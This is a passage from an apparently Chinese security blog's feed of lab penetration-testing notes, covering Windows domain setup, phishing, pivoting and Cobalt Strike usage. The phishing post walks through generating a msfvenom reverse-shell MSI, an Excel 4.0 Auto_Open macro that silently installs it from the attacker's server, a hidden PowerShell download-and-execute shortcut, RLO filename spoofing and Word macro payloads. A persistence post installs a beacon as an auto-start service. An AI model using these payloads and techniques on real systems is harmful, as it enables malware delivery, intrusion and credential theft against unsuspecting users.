alt="image-20220318165937877"></p><blockquote><p>无脑下一步，这三个文件夹后面做渗透测试有用，下一步</p></blockquote><p><img src="/2022/03/18/filed/2012-file.png" alt="image-20220318170058471"></p><blockquote><p>全安装完就会重启，重启完就算完成了</p></blockquote><p><img src="/2022/03/18/filed/2012-over.png" alt="image-20220318173120976"></p><p><img src="/2022/03/18/filed/2012-yu.png" alt="image-20220318173320832"></p><blockquote><p>在开始界面找到Active Directory用户和计算机</p></blockquote><p><img src="/2022/03/18/filed/2012-aduser.png" alt="image-20220318173636990"></p><blockquote><p>用这个来管理域，可以添加用户，计算机或者组等等</p><p>右键Users点击新建-&gt;组</p></blockquote><p><img src="/2022/03/18/filed/2012-group1.png" alt="image-20220318173959219"></p><blockquote><p>新建一个用户</p><p>右键Users点击新建-&gt;用户</p></blockquote><p><img src="/2022/03/18/filed/2012-user1.png" alt="image-20220318174151619"></p><h3 id="Win2008"><a href="#Win2008" class="headerlink" title="Win2008"></a>Win2008</h3><blockquote><p>接下来配置2008的玩意，先改名，比如win2008，然后重启</p></blockquote><p><img src="/2022/03/18/filed/2008-name.png" alt="image-20220318174637381"></p><blockquote><p>修改ip地址</p></blockquote><p><img src="/2022/03/18/filed/2008-ip.png" alt="image-20220318191507608"></p><blockquote><p>把2008加入到这个域中</p></blockquote><p><img src="/2022/03/18/filed/2008-test1.png" alt="image-20220318192000515"></p><blockquote><p>输入user1的账户密码</p></blockquote><p><img src="/2022/03/18/filed/2008-user1.png" alt="image-20220318191926933"></p><blockquote><p>成功，再重启就好了</p></blockquote><p><img src="/2022/03/18/filed/2008-over.png" alt="image-20220318192134231"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> windows </tag>
            
            <tag> 域 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼攻击</title>
      <link href="/2022/03/18/fishing-attack/"/>
      <url>/2022/03/18/fishing-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h1><h2 id="Excel宏钓鱼"><a href="#Excel宏钓鱼" class="headerlink" title="Excel宏钓鱼"></a>Excel宏钓鱼</h2><blockquote><p>在kali里生成一个木马</p></blockquote><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.134 lport=4444 -f msi -o hack.msi</code></pre><blockquote><p>选用msi是因为可以静默安装，进入msf</p></blockquote><pre class=" language-Linux"><code class="language-Linux">msfconsole</code></pre><pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp //设置攻击载荷set lhost 192.168.1.134       //攻击机ipexploit  //开始监听</code></pre><p><img src="/2022/03/18/fishing-attack/fish-msf.png" alt="image-20220318101242286"></p><blockquote><p>把msi文件放入&#x2F;var&#x2F;www&#x2F;html文件夹下</p><p>然后启动apache服务</p></blockquote><pre class=" language-Linux"><code class="language-Linux">apache2 -k startsystemctl start apache2</code></pre><blockquote><p>进入靶机，打开excel，右键sheet1点击插入，点击MS Excel 4.0宏表</p></blockquote><p><img src="/2022/03/18/fishing-attack/fish-excel.png" alt="image-20220318102430105"></p><blockquote><p>在第一列第一行和第二行分别插入</p></blockquote><pre class=" language-Linux"><code class="language-Linux">=EXEC("msiexec /q /i http://192.168.3.134/hack.msi")=HALT()</code></pre><p><img src="/2022/03/18/fishing-attack/fish-exec.png" alt="image-20220318102736146"></p><blockquote><p>然后点击第一列，把名字改成Auto_Open</p></blockquote><p><img src="/2022/03/18/fishing-attack/fish-autoopen.png" alt="image-20220318103121153"></p><blockquote><p>然后右键宏，隐藏</p><p>Ctrl+s保存，保存类型选择为Excel启用宏的工作簿</p><p>接下来只要启用宏，就连接成功了</p></blockquote><h2 id="Ink快捷方式钓鱼"><a href="#Ink快捷方式钓鱼" class="headerlink" title="Ink快捷方式钓鱼"></a>Ink快捷方式钓鱼</h2><blockquote><p>这次用cs玩玩，打开cobaltstrike</p><p>首先生成一个Listener，具体就不细说了，除了ip，其他默认就好</p><p>Attacks-&gt;Web Drive-by-&gt;Scripted Web Delivery （s），监听器选刚创好的</p><p>在靶机创建快捷方式，在快捷方式中输入</p></blockquote><pre class=" language-Linux"><code class="language-Linux">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.3.134:80/a'))"</code></pre><p>&#x3D;&#x3D;ps：powershell的路径是c:\windows\system32\windowspowershell\v1.0,他后面的是在攻击机生成的那一段&#x3D;&#x3D;</p><blockquote><p>创建好文件之后，为了能够更加逼真，我们需要更改文件的图标，比如文件夹的</p><p>右键打开属性，更改图标</p></blockquote><pre class=" language-Linux"><code class="language-Linux">%SystemRoot%\System32\shell32.dll    //系统图标位置</code></pre><blockquote><p>最后只要诱导用户点击，连接就会成功</p></blockquote><h2 id="Unicode字符伪装"><a href="#Unicode字符伪装" class="headerlink" title="Unicode字符伪装"></a>Unicode字符伪装</h2><blockquote><p>首先创建好监听器，然后打开Attacks-&gt;packages-&gt;windows executable</p></blockquote><p><img src="/2022/03/18/fishing-attack/fish-a.png" alt="image-20220318143827787"></p><blockquote><p>把制作的文件放入目标上</p><p>真正文件执行时是a.mp3.exe，a.exe.mp3会让用户觉得是mp3文件</p><p>从右往左写3pm.exe</p><p>修改文件后缀名，先右键插入Unicode字符-&gt;RLO，然后把3pm.exe粘贴进去</p><p>完成</p></blockquote><p>&#x3D;&#x3D;真实名字：a3pm.exe&#x3D;&#x3D;</p><p>&#x3D;&#x3D;用户看到的名字：aexe.mp3&#x3D;&#x3D;</p><h2 id="word宏钓鱼"><a href="#word宏钓鱼" class="headerlink" title="word宏钓鱼"></a>word宏钓鱼</h2><blockquote><p>Attacks-&gt;Packages-&gt;MS_Office Macro,直接把建好的listener放进去就好</p></blockquote><p><img src="/2022/03/18/fishing-attack/fish-office.png" alt="image-20220318144945228"></p><blockquote><p>然后把内容copy下来，打开目标主机的word，打开视图-&gt;宏，创建一个宏</p></blockquote><p><img src="/2022/03/18/fishing-attack/fish-word.png" alt="image-20220318145632151"></p><blockquote><p>保存为.docm文件，打开启用宏主机就上线了</p></blockquote><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> msf </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层连接</title>
      <link href="/2022/03/17/cs-morecommand/"/>
      <url>/2022/03/17/cs-morecommand/</url>
      
        <content type="html"><![CDATA[<h1 id="多层连接"><a href="#多层连接" class="headerlink" title="多层连接"></a>多层连接</h1><blockquote><p>hack(192.168.3.134)—(192.168.3.133)server1(172.16.1.101)—(172.16.1.102)server2</p></blockquote><p><img src="/2022/03/17/cs-morecommand/image-20220328210615591.png" alt="image-20220328210615591"></p><h2 id="多层正向连接"><a href="#多层正向连接" class="headerlink" title="多层正向连接"></a>多层正向连接</h2><blockquote><p>生成一个新的tcp监听器</p></blockquote><p><img src="/2022/03/17/cs-morecommand/cs-tcp.png" alt="image-20220317100151995"></p><blockquote><p>生成一个exe文件，把监听器放入（使用加s的）</p></blockquote><p><img src="/2022/03/17/cs-morecommand/cs-tcps.png" alt="image-20220317100408042"></p><blockquote><p>把制作的东西上传到靶机</p><p>使用server1中间人，右键靶机进入beacon</p></blockquote><pre class=" language-base"><code class="language-base">connect [内网地址]</code></pre><p>(ps,暂时没搭环境，等搭好之后再补充)</p><h2 id="多层反向连接"><a href="#多层反向连接" class="headerlink" title="多层反向连接"></a>多层反向连接</h2><blockquote><p>反向连接更好规避防火墙查杀</p><p>右键靶机-&gt;Pivoting-&gt;Listener</p><p>新建一个脚本，用中间人</p></blockquote><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs-权限维持</title>
      <link href="/2022/03/16/cs-power/"/>
      <url>/2022/03/16/cs-power/</url>
      
        <content type="html"><![CDATA[<h1 id="cs-权限维持"><a href="#cs-权限维持" class="headerlink" title="cs-权限维持"></a>cs-权限维持</h1><blockquote><p>权限维持（windows）</p><p>可以使用注册表或者启动项，计划任务，服务，shift，放大镜功能，各种劫持或者利用各种安装的软件</p></blockquote><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote><p>Attacks-&gt;Packages-&gt;Windows Executable (s)</p></blockquote><p><img src="/2022/03/16/cs-power/cs-executable.png" alt="image-20220316203258034"></p><blockquote><p>保存下来,然后进入Beacon</p></blockquote><pre class=" language-base"><code class="language-base">cd c:\windows\temp      //进入靶机c盘windows下的temp目录upload /root/b.exe        //把保存下来的脚本上传上去shell sc create "thisserver" binpath=" c:\windows\temp\b.exe" //创建系统服务shell sc description "thisserver" "zheshifuwu"        //描述服务shell sc config "thisserver" start= auto        //设置为自动开启shell net start "thisserver"                //开启服务</code></pre><p>&#x3D;&#x3D;（<strong>PS</strong>:等号前不加空格,等号后面加空格）&#x3D;&#x3D;</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs自动克隆网站</title>
      <link href="/2022/03/16/clonesite/"/>
      <url>/2022/03/16/clonesite/</url>
      
        <content type="html"><![CDATA[<h1 id="Clonesite自动克隆网站内容"><a href="#Clonesite自动克隆网站内容" class="headerlink" title="Clonesite自动克隆网站内容"></a>Clonesite自动克隆网站内容</h1><blockquote><p>Attacks-&gt;HTML Application</p></blockquote><p><img src="/2022/03/16/clonesite/cs-html.png" alt="image-20220316161114943"></p><blockquote><p>会生成一个elil.html文件</p><p>保存下来，然后打开Attacks-&gt;Web Drive-by-&gt;Host File</p></blockquote><p><img src="/2022/03/16/clonesite/cs-hostfile.png" alt="image-20220316161955804"></p><blockquote><p>点击Launch之后会生成一个新的连接，把他保存下来，然后让目标执行</p><pre class=" language-base"><code class="language-base">http://192.168.43.46:80/download/evil.hta</code></pre></blockquote><p><img src="/2022/03/16/clonesite/cs-yes.png" alt="image-20220316163222547"></p><blockquote><p>上线成功</p></blockquote><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote><p>Attacks-&gt;Web Drive-by-&gt;Clone Site</p></blockquote><p><img src="/2022/03/16/clonesite/cs-clone.png" alt="image-20220316163814123"></p><blockquote><p>会克隆一个百度的网站，靶机访问他的话就会中招</p></blockquote><p><img src="/2022/03/16/clonesite/cs-baidu.png" alt="image-20220316164039021"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs-aggresor脚本使用</title>
      <link href="/2022/03/15/cs-aggresor/"/>
      <url>/2022/03/15/cs-aggresor/</url>
      
        <content type="html"><![CDATA[<h1 id="Aggresor脚本"><a href="#Aggresor脚本" class="headerlink" title="Aggresor脚本"></a>Aggresor脚本</h1><blockquote><p>.cna后缀的 -Aggressor Script</p><p>Sleep语言</p><p>在View-&gt;Script Console</p></blockquote><p><img src="/2022/03/15/cs-aggresor/cs-Script.png"></p><pre class=" language-sleep"><code class="language-sleep">$ = 变量@ = 数组% = 字典</code></pre><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><blockquote><p>在&#x2F;root目录下新建一个文件1.cna，内容是</p><pre class=" language-sleep"><code class="language-sleep">@arr1=@('a1','a2',887);    //定义一个数组arr1println(@arr1[1]);            //输出数组的第二个</code></pre><p>完成之后在cs里的Script Console解释器里输入</p><pre class=" language-sleep"><code class="language-sleep">load /root/1.cna</code></pre></blockquote><p><img src="/2022/03/15/cs-aggresor/cs-load.png" alt="image-20220316100726843"></p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><pre class=" language-sleep"><code class="language-sleep">@arr1 = @('a1','a2',887); foreach $var (@arr1)&#123;   //for循环,定义变量var，循环内容是arr1     println($var);&#125;</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-for.png" alt="image-20220316101454410"></p><h3 id="sleep-jar"><a href="#sleep-jar" class="headerlink" title="sleep.jar"></a>sleep.jar</h3><blockquote><p>Sleep语言下载地址：<a href="http://sleep.dashnine.org/download/sleep.jar">http://sleep.dashnine.org/download/sleep.jar</a></p></blockquote><pre class=" language-linux"><code class="language-linux">java -jar /root/sleep.jar</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-java.png" alt="image-20220316102413454"></p><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><pre class=" language-sleep"><code class="language-sleep">$x = 1;%dic["key1"] = "value1";%dic["key2"] = "value2";%dic[$x] = "value3";println("%dic is".%dic);</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-key.png" alt="image-20220316103106151"></p><h3 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h3><blockquote><p>新建一个文件，在文件里随便输入点什么，比如</p><pre class=" language-sleep"><code class="language-sleep">println ("haha nihao");</code></pre><p>在Script Console里加载，并通过ls加载</p></blockquote><p><img src="/2022/03/15/cs-aggresor/cs-load2.png" alt="image-20220316103631945"></p><pre class=" language-sleep"><code class="language-sleep">command w&#123;            \\快捷键  println("you click w");&#125;</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-w.png" alt="image-20220316105353679"></p><blockquote><p>tron        开启函数跟踪</p><p>troff        关闭函数跟踪</p></blockquote><pre class=" language-sleep"><code class="language-sleep">sub fun1&#123;               //定义函数  println("run fun1!!!! now $1");&#125;command f1 &#123;  fun1($1);&#125;</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-fun.png" alt="image-20220316110257416"></p><h3 id="c2客户端"><a href="#c2客户端" class="headerlink" title="c2客户端"></a>c2客户端</h3><blockquote><p>命令中编写的东西可以直接影响界面的内容</p></blockquote><pre class=" language-sleep"><code class="language-sleep">bind Ctrl+O &#123;    //绑定快捷键  show_message("this is a alert");  elog("i am log");&#125;</code></pre><blockquote><p>重新加载后按快捷键</p></blockquote><p><img src="/2022/03/15/cs-aggresor/cs-alert.png" alt="image-20220316144939948"></p><blockquote><p>菜单，重新加载后就会出现图中内容</p></blockquote><pre class=" language-sleep"><code class="language-sleep">popup caidan1&#123;   //自定义弹窗  item("&item1",&#123;url_open("http://www.baidu.com")&#125;);  separator();    //分隔符  item("&item2",&#123;url-open("http://www.cctv.com")&#125;);&#125;menubar("my caidan","caidan1");   //菜单栏</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-menu.png" alt="image-20220316145824830"></p><blockquote><p>可以在别的模块上加入自己写的，比如在beacon上</p></blockquote><pre class=" language-sleep"><code class="language-sleep">popup beacon_bottom&#123;    menu "attack"&#123;        item("&item1",&#123;url_open("http://www.baidu.com")&#125;);       &#125;&#125;</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-attack.png" alt="image-20220316150217088"></p><h2 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h2><pre class=" language-sleep"><code class="language-sleep">targets        存储的目标信息    显示上线过的主机信息archives    显示最近的信息    显示最近的输出信息（慎用很卡）beacons        显示所有的受感染的主机信息    显示在线和上线过的主机credentials    显示凭据信息    我们抓取过的密码信息和制作的票据信息downloads    显示下载信息    显示我们在受控端下载的信息keystrokes    记录键盘输入    当我们选择进程近路键盘的时候，会将得到的键盘信息记录下来screenshots    屏幕截图显示    显示我们截图的二进制信息流sites        托管的资产    看起来是我们创建的监听的端口个Stager回连的端口</code></pre><pre class=" language-sleep"><code class="language-sleep">x targets()   //输出目标信息x targets()[0]['name'] //只输出name信息</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-targets.png" alt="image-20220316151406387"></p><p><img src="/2022/03/15/cs-aggresor/cs-name.png" alt="image-20220316151552178"></p><blockquote><p>可以利用在脚本里</p></blockquote><pre class=" language-sleep"><code class="language-sleep">command showme&#123;  println("ip address is :".targets()[$1]["address"]."\n os is :".targets()[$1]["os"]);&#125;</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-showme.png" alt="image-20220316152026898"></p><blockquote><p>显示所有监听器</p></blockquote><pre class=" language-sleep"><code class="language-sleep">printAll(listeners());</code></pre><p><img src="/2022/03/15/cs-aggresor/cs-listeners.png" alt="image-20220316152315506"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs-部分模块使用</title>
      <link href="/2022/03/15/cs-command/"/>
      <url>/2022/03/15/cs-command/</url>
      
        <content type="html"><![CDATA[<h1 id="CS常用命令"><a href="#CS常用命令" class="headerlink" title="CS常用命令"></a>CS常用命令</h1><pre class=" language-base"><code class="language-base">help            帮助sleep            修改睡眠时间getsystem        尝试获取system权限getuid            查看当前登录用户getprivs        获取肉鸡所包含的所有权限shell whoami piv     同上desktop            打开桌面excute            后台运行，没有回显prowershell        使用prowershell执行命令prowerpick        不通过prowershell执行命令porwershell-import    脚本加载目标系统内存，然后执行</code></pre><h2 id="Windows权限"><a href="#Windows权限" class="headerlink" title="Windows权限"></a>Windows权限</h2><blockquote><p>guest</p><p>user</p><p>Administrator</p><p>system</p><p>TrustInstaller              &#x2F;&#x2F;信任的安装者，真正意义上最高权限</p></blockquote><h2 id="Browser-Pivot"><a href="#Browser-Pivot" class="headerlink" title="Browser Pivot"></a>Browser Pivot</h2><blockquote><p>劫持目标主机IE浏览器，可以通过本地浏览器劫持目标cookie</p><p>右键肉鸡-&gt;Explore-&gt;Browser Pivot</p></blockquote><p><img src="/2022/03/15/cs-command/cs-prowser.png" alt="image-20220315191041972"></p><h2 id="Desktop-VNC"><a href="#Desktop-VNC" class="headerlink" title="Desktop VNC"></a>Desktop VNC</h2><blockquote><p>打开主机桌面</p><p>右键肉鸡-&gt;Explore-&gt;Desktop （VNC）</p></blockquote><p><img src="/2022/03/15/cs-command/cs-desktop.png" alt="image-20220315191431211"></p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><pre class=" language-base"><code class="language-base">net localgroupnet computersnet dclistnet domain_trustsnet logonsnet share</code></pre><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><blockquote><p>右键肉鸡-&gt;Explore-&gt;Port Scan</p></blockquote><p><img src="/2022/03/15/cs-command/cs-port.png" alt="image-20220315192227601"></p><blockquote><p>可以内网可以外网</p></blockquote><h2 id="Processes-List"><a href="#Processes-List" class="headerlink" title="Processes List"></a>Processes List</h2><blockquote><p>底下那堆按钮的作用</p></blockquote><p><img src="/2022/03/15/cs-command/cs-processes.png" alt="image-20220315192500576"></p><pre class=" language-base"><code class="language-base">kill            关闭进程Refresh            刷新inject            把攻击载荷注入目标进程，能达到永久控制的目的Log Keystrokes    键盘记录（ps:在view->keystrokes里查看）ScreenshotSteal Token</code></pre><p><img src="/2022/03/15/cs-command/cs-keystrokes.png" alt="image-20220315193140198"></p><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><blockquote><p>记录</p><p>右键肉鸡-&gt;Session-&gt;note</p></blockquote><pre class=" language-base"><code class="language-base">note 命令同理</code></pre><p><img src="/2022/03/15/cs-command/cs-note.png" alt="image-20220315193508617"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs-beacon</title>
      <link href="/2022/03/14/cs-beacon/"/>
      <url>/2022/03/14/cs-beacon/</url>
      
        <content type="html"><![CDATA[<h1 id="Beacon功能"><a href="#Beacon功能" class="headerlink" title="Beacon功能"></a>Beacon功能</h1><h2 id="Beacon-Commands"><a href="#Beacon-Commands" class="headerlink" title="Beacon Commands"></a>Beacon Commands</h2><pre class=" language-base"><code class="language-base">Command                   Description-------                   -----------browserpivot              注入受害者浏览器进程bypassuac                 绕过UACcancel                    取消正在进行的下载cd                        切换目录checkin                   强制让被控端回连一次clear                     清除beacon内部的任务队列connect                   Connect to a Beacon peer over TCPcovertvpn                 部署Covert VPN客户端cp                        复制文件dcsync                    从DC中提取密码哈希desktop                   远程VNCdllinject                 反射DLL注入进程dllload                   使用LoadLibrary将DLL加载到进程中download                  下载文件downloads                 列出正在进行的文件下载drives                    列出目标盘符elevate                   尝试提权execute                   在目标上执行程序(无输出)execute-assembly          在目标上内存中执行本地.NET程序exit                      退出beacongetprivs                  Enable system privileges on current tokengetsystem                 尝试获取SYSTEM权限getuid                    获取用户IDhashdump                  转储密码哈希值help                      帮助inject                    在特定进程中生成会话jobkill                   杀死一个后台任务jobs                      列出后台任务kerberos_ccache_use       从ccache文件中导入票据应用于此会话kerberos_ticket_purge     清除当前会话的票据kerberos_ticket_use       从ticket文件中导入票据应用于此会话keylogger                 键盘记录kill                      结束进程link                      Connect to a Beacon peer over a named pipelogonpasswords            使用mimikatz转储凭据和哈希值ls                        列出文件make_token                创建令牌以传递凭据mimikatz                  运行mimikatzmkdir                     创建一个目录mode dns                  使用DNS A作为通信通道(仅限DNS beacon)mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)mode http                 使用HTTP作为通信通道mv                        移动文件net                       net命令note                      备注       portscan                  进行端口扫描powerpick                 通过Unmanaged PowerShell执行命令powershell                通过powershell.exe执行命令powershell-import         导入powershell脚本ppid                      Set parent PID for spawned post-ex jobsps                        显示进程列表psexec                    Use a service to spawn a session on a hostpsexec_psh                Use PowerShell to spawn a session on a hostpsinject                  在特定进程中执行PowerShell命令pth                       使用Mimikatz进行传递哈希pwd                       当前目录位置reg                       Query the registryrev2self                  恢复原始令牌rm                        删除文件或文件夹rportfwd                  端口转发run                       在目标上执行程序(返回输出)runas                     以另一个用户权限执行程序runasadmin                在高权限下执行程序runu                      Execute a program under another PIDscreenshot                屏幕截图setenv                    设置环境变量shell                     cmd执行命令shinject                  将shellcode注入进程shspawn                   生成进程并将shellcode注入其中sleep                     设置睡眠延迟时间socks                     启动SOCKS4代理socks stop                停止SOCKS4spawn                     Spawn a session spawnas                   Spawn a session as another userspawnto                   Set executable to spawn processes intospawnu                    Spawn a session under another PIDssh                       使用ssh连接远程主机ssh-key                   使用密钥连接远程主机steal_token               从进程中窃取令牌timestomp                 将一个文件时间戳应用到另一个文件unlink                    Disconnect from parent Beaconupload                    上传文件wdigest                   使用mimikatz转储明文凭据winrm                     使用WinRM在主机上生成会话wmi                       使用WMI在主机上生成会话argue                     进程参数欺骗</code></pre><h2 id="实机展示"><a href="#实机展示" class="headerlink" title="实机展示"></a>实机展示</h2><h3 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h3><p>可以更改睡眠时间，有两种方法</p><blockquote><p>右键肉鸡-&gt;Session-&gt;Sleep</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-sleep1.png" alt="image-20220315094923146"></p><p><img src="/2022/03/14/cs-beacon/cs-sleep2.png" alt="image-20220315095026761"></p><blockquote><p>右键肉鸡-&gt;Interact，在Beacon里输入sleep 数字</p></blockquote><p><img src="/2022/03/14/cs-beacon/sleep-beacon.png" alt="image-20220315095239991"></p><h3 id="Attacks-packages-Windows-Executable-s-使用"><a href="#Attacks-packages-Windows-Executable-s-使用" class="headerlink" title="Attacks-packages-Windows Executable(s)使用"></a>Attacks-packages-Windows Executable(s)使用</h3><blockquote><p>Attacks-&gt;packages-&gt;Windows Executable(s)</p></blockquote><p>打开界面</p><p><img src="/2022/03/14/cs-beacon/cs-windows.png" alt="image-20220315095745163"></p><p>生成的.exe文件放进靶机中，让目标服务器执行，就可以了</p><p><img src="/2022/03/14/cs-beacon/cs-exe.png" alt="image-20220315100221977"></p><h3 id="一些有意思的东西"><a href="#一些有意思的东西" class="headerlink" title="一些有意思的东西"></a>一些有意思的东西</h3><h4 id="jobs"><a href="#jobs" class="headerlink" 